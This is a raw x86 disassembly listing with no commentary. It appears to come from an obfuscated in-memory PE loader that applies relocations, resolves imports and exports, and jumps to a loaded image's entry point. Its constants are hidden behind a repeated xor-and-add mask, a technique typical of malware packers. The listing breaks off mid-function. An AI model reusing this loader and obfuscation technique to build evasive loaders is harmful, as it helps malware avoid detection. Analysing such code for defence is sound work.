  426fff:	mov    ebp,esp
  427001:	push   ecx
  427002:	mov    ecx,DWORD PTR [edx+0x194]
  427008:	push   esi
  427009:	mov    esi,DWORD PTR [ebp+0x8]
  42700c:	mov    esi,DWORD PTR [esi]
  42700e:	mov    DWORD PTR [ecx],esi
  427010:	mov    ecx,DWORD PTR [edx+0x194]
  427016:	mov    ecx,DWORD PTR [ecx]
  427018:	mov    esi,DWORD PTR [edx+0x190]
  42701e:	mov    DWORD PTR [esi],ecx
  427020:	mov    eax,DWORD PTR [edx+0x194]
  427026:	mov    ecx,DWORD PTR [eax]
  427028:	mov    ecx,DWORD PTR [ecx+0x3c]
  42702b:	add    ecx,DWORD PTR [eax]
  42702d:	mov    DWORD PTR [ebp-0x4],0xf89ca5a5
  427034:	mov    eax,DWORD PTR [ebp-0x4]
  427037:	movzx  ecx,WORD PTR [ecx+0x16]
  42703b:	xor    eax,0x75108ae
  427040:	add    eax,0x3272f5
  427045:	pop    esi
  427046:	test   ecx,eax
  427048:	je     0x427056
  42704a:	mov    eax,DWORD PTR [edx+0x1c8]
  427050:	mov    DWORD PTR [eax],0xf89c85a2
  427056:	leave  
  427057:	ret    0x4
  42705a:	push   ebp
  42705b:	mov    ebp,esp
  42705d:	sub    esp,0x70
  427060:	and    DWORD PTR [ebp-0x20],0x0
  427064:	mov    DWORD PTR [ebp-0x18],0xf89cb5a5
  42706b:	mov    DWORD PTR [ebp-0x1c],0xf89c85e5
  427072:	mov    DWORD PTR [ebp-0x2c],0xf89c85a1
  427079:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  427080:	mov    DWORD PTR [ebp-0x2c],0xf89f05a5
  427087:	mov    eax,DWORD PTR [ebp+0x20]
  42708a:	mov    eax,DWORD PTR [eax+0x194]
  427090:	mov    DWORD PTR [ebp-0xc],eax
  427093:	mov    eax,DWORD PTR [ebp+0x20]
  427096:	push   ebx
  427097:	push   esi
  427098:	mov    esi,DWORD PTR [eax+0x190]
  42709e:	mov    eax,DWORD PTR [ebp+0x20]
  4270a1:	mov    eax,DWORD PTR [eax+0x18c]
  4270a7:	mov    DWORD PTR [ebp-0x8],eax
  4270aa:	mov    eax,DWORD PTR [eax]
  4270ac:	push   edi
  4270ad:	mov    DWORD PTR [ebp-0x4],esi
  4270b0:	test   eax,eax
  4270b2:	jne    0x4270bf
  4270b4:	push   DWORD PTR [ebp+0x1c]
  4270b7:	mov    edx,DWORD PTR [ebp+0x20]
  4270ba:	call   0x426ffe
  4270bf:	mov    eax,DWORD PTR [esi]
  4270c1:	mov    ebx,DWORD PTR [esi]
  4270c3:	add    ebx,DWORD PTR [eax+0x3c]
  4270c6:	mov    eax,DWORD PTR [ebp+0xc]
  4270c9:	mov    ecx,DWORD PTR [ebp-0x8]
  4270cc:	mov    ecx,DWORD PTR [ecx]
  4270ce:	mov    esi,0x75108ae
  4270d3:	xor    eax,esi
  4270d5:	mov    edi,0x3272f5
  4270da:	add    eax,edi
  4270dc:	cmp    eax,ecx
  4270de:	jne    0x427316
  4270e4:	mov    eax,DWORD PTR [ebp-0xc]
  4270e7:	mov    eax,DWORD PTR [eax]
  4270e9:	mov    DWORD PTR [ebp-0x10],eax
  4270ec:	mov    eax,DWORD PTR [ebx+0x50]
  4270ef:	mov    DWORD PTR [ebp-0x68],eax
  4270f2:	mov    eax,DWORD PTR [ebp-0x18]
  4270f5:	xor    eax,esi
  4270f7:	add    eax,edi
  4270f9:	mov    DWORD PTR [ebp-0x64],eax
  4270fc:	mov    eax,DWORD PTR [ebp-0x14]
  4270ff:	and    DWORD PTR [ebp-0x6c],0x0
  427103:	xor    eax,esi
  427105:	add    eax,edi
  427107:	mov    DWORD PTR [ebp-0x60],eax
  42710a:	lea    eax,[ebp-0x70]
  42710d:	push   eax
  42710e:	mov    eax,DWORD PTR [ebp+0x8]
  427111:	xor    eax,esi
  427113:	add    eax,edi
  427115:	push   eax
  427116:	mov    eax,DWORD PTR [ebp+0x20]
  427119:	add    eax,0xaa
  42711e:	push   eax
  42711f:	mov    eax,DWORD PTR [ebp+0x20]
  427122:	mov    eax,DWORD PTR [eax+0x198]
  427128:	mov    DWORD PTR [ebp-0x70],0x4
  42712f:	push   DWORD PTR [eax]
  427131:	mov    eax,DWORD PTR [ebp+0x10]
  427134:	call   eax
  427136:	mov    ecx,DWORD PTR [ebp-0xc]
  427139:	mov    ecx,DWORD PTR [ecx]
  42713b:	mov    edx,DWORD PTR [ebp-0x8]
  42713e:	mov    DWORD PTR [ebp-0x6c],eax
  427141:	mov    DWORD PTR [ebp+0x1c],eax
  427144:	mov    DWORD PTR [edx],ecx
  427146:	mov    ecx,DWORD PTR [ebp-0x4]
  427149:	mov    DWORD PTR [ecx],eax
  42714b:	mov    eax,DWORD PTR [ebx+0x50]
  42714e:	mov    DWORD PTR [ebp-0x68],eax
  427151:	mov    eax,DWORD PTR [ebp-0x1c]
  427154:	xor    eax,esi
  427156:	add    eax,edi
  427158:	mov    DWORD PTR [ebp-0x64],eax
  42715b:	lea    eax,[ebp-0x20]
  42715e:	mov    DWORD PTR [ebp-0x60],eax
  427161:	lea    eax,[ebp-0x70]
  427164:	push   eax
  427165:	mov    eax,DWORD PTR [ebp+0x8]
  427168:	xor    eax,esi
  42716a:	add    eax,edi
  42716c:	push   eax
  42716d:	mov    eax,DWORD PTR [ebp+0x20]
  427170:	add    eax,0xee
  427175:	push   eax
  427176:	mov    eax,DWORD PTR [ebp+0x20]
  427179:	mov    eax,DWORD PTR [eax+0x198]
  42717f:	mov    DWORD PTR [ebp-0x70],0x4
  427186:	push   DWORD PTR [eax]
  427188:	mov    eax,DWORD PTR [ebp+0x10]
  42718b:	call   eax
  42718d:	test   eax,eax
  42718f:	je     0x4271b4
  427191:	and    DWORD PTR [ebp+0xc],0x0
  427195:	cmp    DWORD PTR [ebx+0x50],0x0
  427199:	jbe    0x4271b4
  42719b:	mov    eax,DWORD PTR [ebp+0x1c]
  42719e:	mov    ecx,DWORD PTR [ebp-0x10]
  4271a1:	sub    ecx,eax
  4271a3:	mov    dl,BYTE PTR [ecx+eax*1]
  4271a6:	inc    DWORD PTR [ebp+0xc]
  4271a9:	mov    BYTE PTR [eax],dl
  4271ab:	mov    edx,DWORD PTR [ebp+0xc]
  4271ae:	inc    eax
  4271af:	cmp    edx,DWORD PTR [ebx+0x50]
  4271b2:	jb     0x4271a3
  4271b4:	mov    edx,DWORD PTR [ebp+0x1c]
  4271b7:	mov    ecx,DWORD PTR [edx+0x3c]
  4271ba:	add    ecx,edx
  4271bc:	mov    eax,DWORD PTR [ecx+0xa0]
  4271c2:	mov    ebx,DWORD PTR [ecx+0x28]
  4271c5:	add    eax,edx
  4271c7:	sub    edx,DWORD PTR [ebp-0x10]
  4271ca:	add    ebx,DWORD PTR [ebp+0x1c]
  4271cd:	mov    DWORD PTR [ebp+0xc],edx
  4271d0:	mov    DWORD PTR [ebp-0x2c],ecx
  4271d3:	mov    DWORD PTR [ebp-0x14],ebx
  4271d6:	mov    DWORD PTR [ebp-0x8],0x0
  4271dd:	jmp    0x427259
  4271df:	add    edx,0xfffffff8
  4271e2:	shr    edx,1
  4271e4:	mov    DWORD PTR [ebp-0x18],edx
  4271e7:	je     0x427245
  4271e9:	lea    edx,[eax+0x8]
  4271ec:	mov    DWORD PTR [ebp-0x4],edx
  4271ef:	mov    edx,DWORD PTR [ebp-0x18]
  4271f2:	mov    DWORD PTR [ebp-0x18],edx
  4271f5:	mov    edx,DWORD PTR [ebp-0x4]
  4271f8:	movzx  edx,WORD PTR [edx]
  4271fb:	mov    DWORD PTR [ebp-0x24],edx
  4271fe:	and    edx,0xfff
  427204:	mov    DWORD PTR [ebp-0x28],edx
  427207:	mov    edx,DWORD PTR [ebp-0x24]
  42720a:	shr    edx,0xc
  42720d:	add    edx,0xffcd8d0b
  427213:	xor    edx,esi
  427215:	cmp    edx,0xf89c85a0
  42721b:	jne    0x42723c
  42721d:	mov    edx,DWORD PTR [ebp-0x28]
  427220:	add    edx,DWORD PTR [ebp+0x1c]
  427223:	mov    ebx,DWORD PTR [eax]
  427225:	cmp    DWORD PTR [ebx+edx*1],0x0
  427229:	je     0x427239
  42722b:	mov    ecx,DWORD PTR [ebp+0xc]
  42722e:	add    ecx,DWORD PTR [ebx+edx*1]
  427231:	mov    ebx,DWORD PTR [eax]
  427233:	mov    DWORD PTR [edx+ebx*1],ecx
  427236:	mov    ecx,DWORD PTR [ebp-0x2c]
  427239:	mov    ebx,DWORD PTR [ebp-0x14]
  42723c:	add    DWORD PTR [ebp-0x4],0x2
  427240:	dec    DWORD PTR [ebp-0x18]
  427243:	jne    0x4271f5
  427245:	mov    edx,DWORD PTR [ebp-0xc]
  427248:	add    DWORD PTR [ebp-0x8],edx
  42724b:	mov    edx,DWORD PTR [ebp-0x8]
  42724e:	cmp    edx,DWORD PTR [ecx+0xa4]
  427254:	jae    0x427267
  427256:	add    eax,DWORD PTR [ebp-0xc]
  427259:	mov    edx,DWORD PTR [eax+0x4]
  42725c:	mov    DWORD PTR [ebp-0xc],edx
  42725f:	test   edx,edx
  427261:	jne    0x4271df
  427267:	mov    eax,DWORD PTR [ebp-0x10]
  42726a:	mov    DWORD PTR [ebp-0x6c],eax
  42726d:	mov    DWORD PTR [ebp-0x70],0x4
  427274:	mov    eax,DWORD PTR [ecx+0x50]
  427277:	mov    DWORD PTR [ebp-0x68],eax
  42727a:	mov    eax,DWORD PTR [ebp-0x1c]
  42727d:	xor    eax,esi
  42727f:	add    eax,edi
  427281:	mov    DWORD PTR [ebp-0x64],eax
  427284:	lea    eax,[ebp-0x20]
  427287:	mov    DWORD PTR [ebp-0x60],eax
  42728a:	lea    eax,[ebp-0x70]
  42728d:	push   eax
  42728e:	mov    eax,DWORD PTR [ebp+0x8]
  427291:	xor    eax,esi
  427293:	add    eax,edi
  427295:	push   eax
  427296:	mov    eax,DWORD PTR [ebp+0x20]
  427299:	add    eax,0xee
  42729e:	push   eax
  42729f:	mov    eax,DWORD PTR [ebp+0x20]
  4272a2:	mov    eax,DWORD PTR [eax+0x198]
  4272a8:	push   DWORD PTR [eax]
  4272aa:	mov    eax,DWORD PTR [ebp+0x10]
  4272ad:	call   eax
  4272af:	mov    eax,DWORD PTR [ebp+0x20]
  4272b2:	mov    eax,DWORD PTR [eax+0x180]
  4272b8:	add    eax,DWORD PTR [ebp+0xc]
  4272bb:	mov    ecx,DWORD PTR [ebp+0xc]
  4272be:	push   DWORD PTR [ebp+0x18]
  4272c1:	mov    DWORD PTR [eax],ecx
  4272c3:	push   DWORD PTR [ebp+0x14]
  4272c6:	push   DWORD PTR [ebp+0x1c]
  4272c9:	call   ebx
  4272cb:	mov    ecx,DWORD PTR [ebp+0xc]
  4272ce:	add    ecx,DWORD PTR [ebp+0x20]
  4272d1:	lea    eax,[ebp+0x4]
  4272d4:	mov    DWORD PTR [ebp+0x20],ecx
  4272d7:	mov    ecx,DWORD PTR [ebp+0x20]
  4272da:	mov    ecx,DWORD PTR [ebp+0x20]
  4272dd:	mov    edx,DWORD PTR [ecx+0x190]
  4272e3:	mov    ecx,DWORD PTR [ebp+0x20]
  4272e6:	mov    ecx,DWORD PTR [ecx+0x18c]
  4272ec:	mov    esi,DWORD PTR [ecx]
  4272ee:	cmp    DWORD PTR [eax],esi
  4272f0:	jb     0x427311
  4272f2:	mov    esi,DWORD PTR [edx]
  4272f4:	mov    edi,DWORD PTR [edx]
  4272f6:	mov    esi,DWORD PTR [esi+0x3c]
  4272f9:	lea    esi,[edi+esi*1+0x50]
  4272fd:	mov    edi,DWORD PTR [ecx]
  4272ff:	add    edi,DWORD PTR [esi]
  427301:	cmp    DWORD PTR [eax],edi
  427303:	jae    0x427311
  427305:	mov    esi,DWORD PTR [ecx]
  427307:	mov    ecx,DWORD PTR [eax]
  427309:	mov    edx,DWORD PTR [edx]
  42730b:	sub    ecx,esi
  42730d:	add    edx,ecx
  42730f:	mov    DWORD PTR [eax],edx
  427311:	mov    eax,DWORD PTR [ebp+0xc]
  427314:	jmp    0x427318
  427316:	xor    eax,eax
  427318:	pop    edi
  427319:	pop    esi
  42731a:	pop    ebx
  42731b:	leave  
  42731c:	ret    0x1c
  42731f:	push   ebp
  427320:	mov    ebp,esp
  427322:	sub    esp,0x1c
  427325:	push   esi
  427326:	mov    esi,eax
  427328:	mov    eax,DWORD PTR [ecx+0x190]
  42732e:	cmp    DWORD PTR [eax],0x0
  427331:	je     0x427441
  427337:	test   edx,edx
  427339:	je     0x427441
  42733f:	test   esi,esi
  427341:	je     0x427441
  427347:	mov    eax,DWORD PTR [esi+0x88]
  42734d:	test   eax,eax
  42734f:	je     0x42743c
  427355:	cmp    DWORD PTR [esi+0x8c],0x10
  42735c:	je     0x42743c
  427362:	cmp    DWORD PTR [esi+0x34],edx
  427365:	je     0x42743c
  42736b:	mov    esi,DWORD PTR [ecx+0x18c]
  427371:	and    DWORD PTR [ebp-0x10],0x0
  427375:	mov    ecx,edx
  427377:	sub    ecx,DWORD PTR [esi]
  427379:	add    eax,edx
  42737b:	movzx  edx,WORD PTR [eax+0xc]
  42737f:	mov    DWORD PTR [ebp-0x1c],ecx
  427382:	movzx  ecx,WORD PTR [eax+0xe]
  427386:	add    ecx,edx
  427388:	je     0x42743c
  42738e:	lea    ecx,[eax+0x14]
  427391:	push   ebx
  427392:	mov    DWORD PTR [ebp-0x18],ecx
  427395:	mov    esi,0x7fffffff
  42739a:	push   edi
  42739b:	test   DWORD PTR [ecx],esi
  42739d:	je     0x42741e
  42739f:	mov    edx,DWORD PTR [ecx]
  4273a1:	and    DWORD PTR [ebp-0xc],0x0
  4273a5:	and    edx,esi
  4273a7:	add    edx,eax
  4273a9:	movzx  edi,WORD PTR [edx+0xe]
  4273ad:	movzx  ebx,WORD PTR [edx+0xc]
  4273b1:	add    edi,ebx
  4273b3:	je     0x42741e
  4273b5:	lea    ecx,[edx+0x14]
  4273b8:	mov    DWORD PTR [ebp-0x14],ecx
  4273bb:	test   DWORD PTR [ecx],esi
  4273bd:	je     0x427400
  4273bf:	mov    ecx,DWORD PTR [ecx]
  4273c1:	and    DWORD PTR [ebp-0x8],0x0
  4273c5:	and    ecx,esi
  4273c7:	add    ecx,eax
  4273c9:	movzx  edi,WORD PTR [ecx+0xe]
  4273cd:	movzx  ebx,WORD PTR [ecx+0xc]
  4273d1:	add    edi,ebx
  4273d3:	je     0x427400
  4273d5:	lea    edi,[ecx+0x14]
  4273d8:	mov    DWORD PTR [ebp-0x4],edi
  4273db:	mov    edi,DWORD PTR [ebp-0x4]
  4273de:	mov    edi,DWORD PTR [edi]
  4273e0:	test   edi,edi
  4273e2:	je     0x4273ea
  4273e4:	mov    ebx,DWORD PTR [ebp-0x1c]
  4273e7:	add    DWORD PTR [edi+eax*1],ebx
  4273ea:	movzx  edi,WORD PTR [ecx+0xe]
  4273ee:	movzx  ebx,WORD PTR [ecx+0xc]
  4273f2:	inc    DWORD PTR [ebp-0x8]
  4273f5:	add    DWORD PTR [ebp-0x4],0x8
  4273f9:	add    edi,ebx
  4273fb:	cmp    DWORD PTR [ebp-0x8],edi
  4273fe:	jb     0x4273db
  427400:	movzx  edi,WORD PTR [edx+0xe]
  427404:	movzx  ebx,WORD PTR [edx+0xc]
  427408:	mov    ecx,DWORD PTR [ebp-0x14]
  42740b:	inc    DWORD PTR [ebp-0xc]
  42740e:	add    ecx,0x8
  427411:	add    edi,ebx
  427413:	mov    DWORD PTR [ebp-0x14],ecx
  427416:	cmp    DWORD PTR [ebp-0xc],edi
  427419:	jb     0x4273bb
  42741b:	mov    ecx,DWORD PTR [ebp-0x18]
  42741e:	movzx  edx,WORD PTR [eax+0xe]
  427422:	movzx  edi,WORD PTR [eax+0xc]
  427426:	inc    DWORD PTR [ebp-0x10]
  427429:	add    ecx,0x8
  42742c:	add    edx,edi
  42742e:	mov    DWORD PTR [ebp-0x18],ecx
  427431:	cmp    DWORD PTR [ebp-0x10],edx
  427434:	jb     0x42739b
  42743a:	pop    edi
  42743b:	pop    ebx
  42743c:	xor    eax,eax
  42743e:	inc    eax
  42743f:	jmp    0x427443
  427441:	xor    eax,eax
  427443:	pop    esi
  427444:	leave  
  427445:	ret    
  427446:	push   ebp
  427447:	mov    ebp,esp
  427449:	mov    ecx,DWORD PTR [ecx+0x190]
  42744f:	mov    eax,DWORD PTR [ebp+0xc]
  427452:	sub    esp,0x10
  427455:	push   ebx
  427456:	xor    ebx,ebx
  427458:	push   esi
  427459:	push   edi
  42745a:	cmp    DWORD PTR [ecx],ebx
  42745c:	je     0x4274e4
  427462:	cmp    eax,ebx
  427464:	je     0x4274e4
  427466:	cmp    DWORD PTR [eax+0x78],ebx
  427469:	jne    0x427470
  42746b:	xor    eax,eax
  42746d:	inc    eax
  42746e:	jmp    0x4274e6
  427470:	mov    eax,DWORD PTR [eax+0x78]
  427473:	add    eax,DWORD PTR [ebp+0x8]
  427476:	mov    ecx,DWORD PTR [eax+0x1c]
  427479:	mov    edx,DWORD PTR [eax+0x24]
  42747c:	mov    esi,DWORD PTR [eax+0x14]
  42747f:	mov    edi,DWORD PTR [eax+0x18]
  427482:	add    ecx,DWORD PTR [ebp+0x8]
  427485:	add    edx,DWORD PTR [ebp+0x8]
  427488:	mov    DWORD PTR [ebp-0x4],esi
  42748b:	cmp    esi,edi
  42748d:	ja     0x427492
  42748f:	mov    DWORD PTR [ebp-0x4],edi
  427492:	mov    DWORD PTR [ebp-0x8],ebx
  427495:	cmp    DWORD PTR [ebp-0x4],ebx
  427498:	jbe    0x42746b
  42749a:	cmp    ebx,DWORD PTR [eax+0x14]
  42749d:	jae    0x4274a5
  42749f:	movzx  esi,WORD PTR [edx+ebx*2]
  4274a3:	jmp    0x4274a7
  4274a5:	mov    esi,ebx
  4274a7:	lea    esi,[ecx+esi*4]
  4274aa:	mov    edi,DWORD PTR [esi]
  4274ac:	test   edi,edi
  4274ae:	je     0x4274d9
  4274b0:	add    edi,DWORD PTR [ebp+0x8]
  4274b3:	mov    DWORD PTR [ebp-0x10],edi
  4274b6:	cmp    edi,eax
  4274b8:	jbe    0x4274ca
  4274ba:	mov    ebx,DWORD PTR [ebp+0xc]
  4274bd:	mov    ebx,DWORD PTR [ebx+0x7c]
  4274c0:	add    ebx,eax
  4274c2:	cmp    edi,ebx
  4274c4:	jae    0x4274ca
  4274c6:	mov    esi,DWORD PTR [esi]
  4274c8:	jmp    0x4274d2
  4274ca:	sub    edi,DWORD PTR [ebp+0x8]
  4274cd:	mov    DWORD PTR [esi],edi
  4274cf:	mov    esi,DWORD PTR [ebp-0x10]
  4274d2:	test   esi,esi
  4274d4:	je     0x4274e4
  4274d6:	mov    ebx,DWORD PTR [ebp-0x8]
  4274d9:	inc    ebx
  4274da:	mov    DWORD PTR [ebp-0x8],ebx
  4274dd:	cmp    ebx,DWORD PTR [ebp-0x4]
  4274e0:	jb     0x42749a
  4274e2:	jmp    0x42746b
  4274e4:	xor    eax,eax
  4274e6:	pop    edi
  4274e7:	pop    esi
  4274e8:	pop    ebx
  4274e9:	leave  
  4274ea:	ret    0x8
  4274ed:	push   ebp
  4274ee:	mov    ebp,esp
  4274f0:	sub    esp,0x2c
  4274f3:	mov    edx,0xf89c85a5
  4274f8:	mov    DWORD PTR [ebp-0x4],edx
  4274fb:	mov    DWORD PTR [ebp-0x8],0xf89c85a2
  427502:	mov    eax,DWORD PTR [ebp-0x4]
  427505:	mov    ecx,DWORD PTR [ebp-0x4]
  427508:	mov    ecx,DWORD PTR [ebp-0x4]
  42750b:	mov    ecx,DWORD PTR [ebp-0x4]
  42750e:	mov    ecx,DWORD PTR [ebp-0x4]
  427511:	mov    ecx,DWORD PTR [ebp-0x4]
  427514:	push   ebx
  427515:	mov    ebx,DWORD PTR [ebp+0x10]
  427518:	push   esi
  427519:	mov    esi,0x75108ae
  42751e:	mov    DWORD PTR [ebp-0x10],0x352eb2f
  427525:	mov    ecx,DWORD PTR [ebp-0x4]
  427528:	mov    ebx,DWORD PTR [ebx+0x190]
  42752e:	push   edi
  42752f:	mov    edi,0x3272f5
  427534:	xor    ecx,esi
  427536:	xor    eax,esi
  427538:	add    eax,edi
  42753a:	add    ecx,edi
  42753c:	mov    DWORD PTR [ebp-0x18],eax
  42753f:	cmp    ecx,DWORD PTR [ebx]
  427541:	je     0x4277c2
  427547:	mov    ebx,DWORD PTR [ebp-0x4]
  42754a:	mov    ecx,DWORD PTR [ebp+0xc]
  42754d:	xor    ebx,esi
  42754f:	add    ebx,edi
  427551:	cmp    ebx,ecx
  427553:	je     0x4277c2
  427559:	mov    ebx,DWORD PTR [ebp-0x4]
  42755c:	mov    ecx,DWORD PTR [ecx+0x80]
  427562:	xor    ebx,esi
  427564:	add    ebx,edi
  427566:	cmp    ecx,ebx
  427568:	je     0x4277bd
  42756e:	add    ecx,DWORD PTR [ebp+0x8]
  427571:	mov    DWORD PTR [ebp-0x2c],ecx
  427574:	mov    ebx,edx
  427576:	xor    ebx,esi
  427578:	add    ebx,edi
  42757a:	mov    DWORD PTR [ebp-0x10],ebx
  42757d:	mov    ebx,DWORD PTR [ebp-0x10]
  427580:	cmp    ebx,edx
  427582:	je     0x427596
  427584:	mov    edx,DWORD PTR [ebp-0x10]
  427587:	mov    ebx,DWORD PTR [ebp-0x4]
  42758a:	imul   edx,edx,0x14
  42758d:	xor    ebx,esi
  42758f:	add    ebx,edi
  427591:	cmp    DWORD PTR [edx+ecx*1],ebx
  427594:	jne    0x4275ad
  427596:	mov    edx,DWORD PTR [ebp-0x10]
  427599:	mov    ebx,DWORD PTR [ebp-0x4]
  42759c:	imul   edx,edx,0x14
  42759f:	xor    ebx,esi
  4275a1:	add    ebx,edi
  4275a3:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  4275a7:	je     0x4277af
  4275ad:	mov    eax,DWORD PTR [ebp-0x4]
  4275b0:	mov    ebx,DWORD PTR [ebp-0x4]
  4275b3:	mov    eax,DWORD PTR [ebp-0x10]
  4275b6:	imul   eax,eax,0x14
  4275b9:	add    eax,ecx
  4275bb:	mov    ecx,DWORD PTR [eax+0x10]
  4275be:	add    ecx,DWORD PTR [ebp+0x8]
  4275c1:	xor    ebx,esi
  4275c3:	mov    DWORD PTR [ebp-0x1c],ecx
  4275c6:	mov    ecx,DWORD PTR [ebp-0x4]
  4275c9:	mov    edx,DWORD PTR [ebp-0x4]
  4275cc:	xor    ecx,esi
  4275ce:	add    ecx,edi
  4275d0:	xor    edx,esi
  4275d2:	mov    DWORD PTR [ebp-0x24],ecx
  4275d5:	mov    ecx,DWORD PTR [eax]
  4275d7:	add    edx,edi
  4275d9:	add    ebx,edi
  4275db:	cmp    ecx,edx
  4275dd:	je     0x4275e5
  4275df:	add    ecx,DWORD PTR [ebp+0x8]
  4275e2:	mov    DWORD PTR [ebp-0x24],ecx
  4275e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4275e8:	xor    ecx,esi
  4275ea:	add    ecx,DWORD PTR [eax+0xc]
  4275ed:	mov    eax,DWORD PTR [ebp+0x8]
  4275f0:	lea    eax,[ecx+eax*1+0x3272f5]
  4275f7:	mov    DWORD PTR [ebp+0xc],eax
  4275fa:	mov    DWORD PTR [ebp-0x28],0xf89c85be
  427601:	mov    eax,DWORD PTR [ebp+0x10]
  427604:	push   DWORD PTR [ebp+0xc]
  427607:	mov    eax,DWORD PTR [eax+0x1e0]
  42760d:	call   DWORD PTR [eax]
  42760f:	mov    ecx,DWORD PTR [ebp-0x4]
  427612:	xor    ecx,esi
  427614:	add    ecx,edi
  427616:	mov    DWORD PTR [ebp-0xc],eax
  427619:	cmp    ecx,eax
  42761b:	jne    0x42762f
  42761d:	mov    eax,DWORD PTR [ebp+0x10]
  427620:	push   DWORD PTR [ebp+0xc]
  427623:	mov    eax,DWORD PTR [eax+0x1e0]
  427629:	call   DWORD PTR [eax+0xc]
  42762c:	mov    DWORD PTR [ebp-0xc],eax
  42762f:	mov    DWORD PTR [ebp-0x20],0x7f661b2a
  427636:	mov    DWORD PTR [ebp-0x20],0xf89c985a
  42763d:	mov    eax,DWORD PTR [ebp-0x4]
  427640:	xor    eax,esi
  427642:	add    eax,edi
  427644:	cmp    eax,DWORD PTR [ebp-0xc]
  427647:	jne    0x42766c
  427649:	mov    eax,DWORD PTR [ebp-0x8]
  42764c:	mov    ecx,DWORD PTR [ebp-0x20]
  42764f:	xor    eax,esi
  427651:	xor    ecx,esi
  427653:	lea    ebx,[ebx+eax*1+0x3272f5]
  42765a:	mov    eax,DWORD PTR [ebp+0x10]
  42765d:	mov    eax,DWORD PTR [eax+0x1e0]
  427663:	add    ecx,edi
  427665:	imul   ecx,ebx
  427668:	push   ecx
  427669:	call   DWORD PTR [eax+0x24]
  42766c:	mov    eax,DWORD PTR [ebp-0x4]
  42766f:	xor    eax,esi
  427671:	add    eax,edi
  427673:	cmp    eax,DWORD PTR [ebp-0xc]
  427676:	jne    0x427687
  427678:	mov    eax,DWORD PTR [ebp-0x28]
  42767b:	xor    eax,esi
  42767d:	add    eax,edi
  42767f:	cmp    ebx,eax
  427681:	jbe    0x427601
  427687:	mov    eax,DWORD PTR [ebp-0x4]
  42768a:	xor    eax,esi
  42768c:	add    eax,edi
  42768e:	cmp    eax,DWORD PTR [ebp-0xc]
  427691:	jne    0x4276aa
  427693:	mov    eax,DWORD PTR [ebp-0x8]
  427696:	mov    ecx,DWORD PTR [ebp-0x18]
  427699:	xor    eax,esi
  42769b:	lea    eax,[ecx+eax*1+0x3272f5]
  4276a2:	mov    DWORD PTR [ebp-0x18],eax
  4276a5:	jmp    0x427799
  4276aa:	mov    DWORD PTR [ebp-0x14],0x1121b2d
  4276b1:	mov    DWORD PTR [ebp+0xc],0xe042d2f
  4276b8:	mov    ebx,DWORD PTR [ebp-0x4]
  4276bb:	xor    ebx,esi
  4276bd:	add    ebx,edi
  4276bf:	jmp    0x427786
  4276c4:	mov    eax,DWORD PTR [ebp-0x4]
  4276c7:	xor    eax,esi
  4276c9:	add    eax,edi
  4276cb:	mov    DWORD PTR [ebp-0x14],eax
  4276ce:	mov    eax,DWORD PTR [ebp-0x4]
  4276d1:	xor    eax,esi
  4276d3:	add    eax,edi
  4276d5:	mov    DWORD PTR [ebp+0xc],eax
  4276d8:	mov    ecx,DWORD PTR [ebp-0x4]
  4276db:	mov    eax,DWORD PTR [ebp-0x24]
  4276de:	xor    ecx,esi
  4276e0:	add    ecx,edi
  4276e2:	cmp    ecx,eax
  4276e4:	je     0x4276ec
  4276e6:	mov    eax,DWORD PTR [eax+ebx*4]
  4276e9:	mov    DWORD PTR [ebp-0x14],eax
  4276ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4276ef:	mov    eax,DWORD PTR [eax+ebx*4]
  4276f2:	mov    DWORD PTR [ebp+0xc],eax
  4276f5:	mov    eax,DWORD PTR [ebp-0x4]
  4276f8:	mov    ecx,DWORD PTR [ebp-0x14]
  4276fb:	xor    eax,esi
  4276fd:	add    eax,edi
  4276ff:	cmp    eax,ecx
  427701:	je     0x42772c
  427703:	mov    eax,DWORD PTR [ebp-0x4]
  427706:	mov    ecx,DWORD PTR [ebp-0x14]
  427709:	xor    eax,esi
  42770b:	add    eax,edi
  42770d:	shr    ecx,0x1f
  427710:	cmp    eax,ecx
  427712:	je     0x42772c
  427714:	mov    ecx,DWORD PTR [ebp-0x14]
  427717:	mov    eax,DWORD PTR [ebp+0x10]
  42771a:	mov    eax,DWORD PTR [eax+0x1e0]
  427720:	movzx  ecx,cx
  427723:	push   ecx
  427724:	push   DWORD PTR [ebp-0xc]
  427727:	call   DWORD PTR [eax+0x8]
  42772a:	jmp    0x427745
  42772c:	mov    eax,DWORD PTR [ebp+0xc]
  42772f:	add    eax,DWORD PTR [ebp+0x8]
  427732:	mov    ecx,DWORD PTR [ebp+0x10]
  427735:	mov    ecx,DWORD PTR [ecx+0x1e0]
  42773b:	add    eax,0x2
  42773e:	push   eax
  42773f:	push   DWORD PTR [ebp-0xc]
  427742:	call   DWORD PTR [ecx+0x8]
  427745:	mov    DWORD PTR [ebp+0xc],eax
  427748:	mov    eax,DWORD PTR [ebp-0x4]
  42774b:	mov    ecx,DWORD PTR [ebp+0xc]
  42774e:	xor    eax,esi
  427750:	add    eax,edi
  427752:	cmp    eax,ecx
  427754:	mov    eax,DWORD PTR [ebp-0x8]
  427757:	jne    0x42776a
  427759:	mov    ecx,DWORD PTR [ebp-0x18]
  42775c:	xor    eax,esi
  42775e:	lea    eax,[ecx+eax*1+0x3272f5]
  427765:	mov    DWORD PTR [ebp-0x18],eax
  427768:	jmp    0x42777a
  42776a:	mov    ecx,DWORD PTR [ebp+0xc]
  42776d:	xor    eax,esi
  42776f:	add    eax,edi
  427771:	imul   eax,ecx
  427774:	mov    ecx,DWORD PTR [ebp-0x1c]
  427777:	mov    DWORD PTR [ecx+ebx*4],eax
  42777a:	mov    eax,DWORD PTR [ebp-0x8]
  42777d:	xor    eax,esi
  42777f:	lea    ebx,[ebx+eax*1+0x3272f5]
  427786:	mov    eax,DWORD PTR [ebp-0x4]
  427789:	mov    ecx,DWORD PTR [ebp-0x1c]
  42778c:	xor    eax,esi
  42778e:	add    eax,edi
  427790:	cmp    DWORD PTR [ecx+ebx*4],eax
  427793:	jne    0x4276c4
  427799:	mov    edx,DWORD PTR [ebp-0x10]
  42779c:	mov    eax,DWORD PTR [ebp-0x18]
  42779f:	mov    ecx,DWORD PTR [ebp-0x2c]
  4277a2:	sub    edx,0x3272f4
  4277a8:	xor    edx,esi
  4277aa:	jmp    0x427574
  4277af:	mov    ecx,DWORD PTR [ebp-0x4]
  4277b2:	xor    ecx,esi
  4277b4:	add    ecx,edi
  4277b6:	cmp    eax,ecx
